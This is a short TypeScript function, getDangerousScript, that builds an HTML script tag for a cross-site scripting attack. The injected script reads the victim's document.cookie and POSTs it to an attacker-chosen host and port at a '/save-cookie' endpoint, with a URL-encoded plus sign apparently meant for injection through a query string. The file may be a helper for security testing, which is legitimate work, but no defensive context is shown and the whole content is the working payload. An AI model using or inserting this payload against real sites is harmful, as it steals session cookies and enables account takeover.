export function getDangerousScript(host: string, port: number) {
  let script = "<script type='application/javascript'>"
  script += 'var cookie = document.cookie; '
  script += 'var xhr = new XMLHttpRequest(); '
  script += `xhr.open('POST', 'http://${host}:${port}/save-cookie', true); `
  script += "xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); "
  script += "xhr.send('cookie=' %2B cookie); "
  script += '</script>'

  return script
}